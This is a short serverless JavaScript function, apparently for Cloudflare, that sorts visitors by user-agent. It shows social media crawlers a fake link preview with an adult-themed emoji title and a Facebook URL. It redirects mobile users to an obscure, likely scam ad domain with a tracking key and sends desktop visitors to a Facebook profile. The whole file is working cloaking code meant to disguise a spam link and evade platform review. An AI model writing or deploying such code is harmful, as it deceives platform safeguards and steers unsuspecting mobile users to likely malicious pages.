export async function onRequest(context) {
  const request = context.request;
  const userAgent = request.headers.get('user-agent') || '';

  // 1. Check for Social Media Crawlers / Bots
  const isSocialBot = /facebookexternalhit|Facebot|Twitterbot|Pinterest|LinkedInBot|WhatsApp|TelegramBot/i.test(userAgent);

  if (isSocialBot) {
    const htmlContent = `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Welcome</title>
    <meta property="og:title" content="🎬🅿️️⃣️⃣Ⓜ️🎬">
    <meta property="og:description" content="">
    <meta property="og:image" content="	https://lh3.googleusercontent.com/d/1tgS6ca-pCl_VyctJX6wJLrZqRzVJ8Swy">
    <meta property="og:url" content="https://web.facebook.com/">
    <meta property="og:type" content="website">
</head>
<body>
</body>
</html>`;

    return new Response(htmlContent, {
      headers: { 'content-type': 'text/html;charset=UTF-8' },
    });
  }

  // 2. Check for Mobile Users
  const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);

  if (isMobile) {
    return Response.redirect("https://advantagesblareseizure.com/ctf1yk93y?key=813361dc8b9c63dd4f9244cdd92cddc1", 302);
  } else {
    return Response.redirect("https://web.facebook.com/zuck/?_rdc=1&_rdr#", 302);
  }
}
